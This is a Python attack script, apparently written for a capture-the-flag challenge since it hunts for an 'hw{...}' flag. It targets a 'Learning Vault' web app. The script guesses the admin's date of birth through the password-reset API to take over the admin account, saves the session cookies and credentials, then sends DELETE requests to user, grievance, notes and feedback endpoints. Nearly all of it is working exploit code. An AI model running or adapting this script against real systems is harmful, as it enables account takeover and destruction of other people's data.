#!/usr/bin/env python3
"""
Learning Vault - Smart DOB Attack
Based on OSINT: Ethara AI founded in 2020
"""

import requests
import json

BASE_URL = "https://learning-vault-15.emergent.host"
ADMIN_EMAIL = "admin@ethara.ai"
NEW_PASSWORD = "Hacked123!@#"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
})

print("="*70)
print("LEARNING VAULT - SMART DOB ATTACK")
print(f"Target: {ADMIN_EMAIL}")
print("OSINT: Ethara AI founded in 2020")
print("="*70)

# Dates related to Ethara AI founding (2020)
dates_to_try = [
    # Company founding dates
    "2020-01-01",
    "2020-06-01",
    "2020-07-01",
    "2020-08-01",
    "2020-09-01",
    "2020-10-01",
    "2020-11-01",
    "2020-12-01",
    
    # Specific 2020 dates
    "2020-01-15",
    "2020-03-15",
    "2020-06-15",
    "2020-09-15",
    
    # Admin likely birthdates (assuming 30-50 years old)
    "1990-01-01",
    "1985-01-01",
    "1988-01-01",
    "1992-01-01",
    "1995-01-01",
    "1980-01-01",
    "1975-01-01",
    
    # Tech significant dates
    "2023-11-30",  # ChatGPT anniversary
    "2015-12-11",  # OpenAI founded
    
    # Common placeholder dates
    "2000-01-01",
    "1999-12-31",
    "2001-01-01",
]

print(f"\n[*] Testing {len(dates_to_try)} strategic dates...")

success = False
for i, dob in enumerate(dates_to_try):
    print(f"\n[{i+1}/{len(dates_to_try)}] Trying DOB: {dob}")
    
    try:
        reset_data = {
            "email": ADMIN_EMAIL,
            "dob": dob,
            "new_password": NEW_PASSWORD
        }
        resp = session.post(f"{BASE_URL}/api/auth/reset-password", json=reset_data, timeout=10)
        
        print(f"    Status: {resp.status_code}")
        
        if resp.status_code == 200:
            print(f"\n{'='*70}")
            print(f"[!] SUCCESS! Password reset with DOB: {dob}")
            print(f"{'='*70}")
            print(f"    Response: {resp.text}")
            success = True
            
            # Try to login
            print("\n[*] Attempting login...")
            login_data = {"email": ADMIN_EMAIL, "password": NEW_PASSWORD}
            login_resp = session.post(f"{BASE_URL}/api/auth/login", json=login_data, timeout=10)
            
            print(f"    Login Status: {login_resp.status_code}")
            
            if login_resp.status_code == 200:
                print("\n[!] LOGIN SUCCESSFUL!")
                print(f"    Response: {login_resp.text}")
                
                # Save session
                with open("admin_session.json", "w") as f:
                    json.dump({
                        "cookies": dict(session.cookies),
                        "dob": dob,
                        "credentials": {
                            "email": ADMIN_EMAIL,
                            "password": NEW_PASSWORD
                        },
                        "response": login_resp.text
                    }, f, indent=2)
                print("[+] Session saved to admin_session.json")
                
                # Now enumerate admin APIs
                print("\n[PHASE 2] ADMIN API ENUMERATION")
                print("-" * 70)
                
                # Get profile
                profile = session.get(f"{BASE_URL}/api/auth/me", timeout=5)
                if profile.status_code == 200:
                    print(f"[+] Admin Profile: {profile.text}")
                
                # Check for data deletion endpoints
                print("\n[*] Searching for data deletion endpoints...")
                
                delete_tests = [
                    ("/api/users", "GET"),
                    ("/api/users", "DELETE"),
                    ("/api/grievances", "GET"),
                    ("/api/grievances", "DELETE"),
                    ("/api/notes", "GET"),
                    ("/api/notes", "DELETE"),
                    ("/api/feedback", "GET"),
                    ("/api/feedback", "DELETE"),
                    ("/api/analytics/overview", "GET"),
                ]
                
                for endpoint, method in delete_tests:
                    try:
                        if method == "GET":
                            r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
                        else:
                            r = session.delete(f"{BASE_URL}{endpoint}", timeout=5)
                        
                        if r.status_code != 404:
                            print(f"[+] {method} {endpoint} - Status: {r.status_code}")
                            if r.status_code == 200:
                                preview = r.text[:200]
                                print(f"    Preview: {preview}")
                                
                                # Check if flag appeared
                                if "hw{" in r.text:
                                    print(f"\n{'='*70}")
                                    print("[!] FLAG FOUND!")
                                    print(f"{'='*70}")
                                    import re
                                    flags = re.findall(r'hw\{[^}]+\}', r.text)
                                    for flag in flags:
                                        print(f"    {flag}")
                                    print(f"{'='*70}")
                    except:
                        pass
                
                print("\n[*] Next steps:")
                print("1. Explore admin dashboard manually")
                print("2. Look for 'Delete All' or 'Wipe Data' buttons")
                print("3. Execute deletion to trigger flag")
                
            break
            
        elif resp.status_code == 400:
            print(f"    Response: {resp.text[:100]}")
        else:
            print(f"    Unexpected: {resp.text[:100]}")
            
    except Exception as e:
        print(f"    Error: {e}")

if not success:
    print("\n[-] No valid DOB found")
    print("[*] Manual browser-based attack recommended")
else:
    print("\n[+] Exploit successful!")
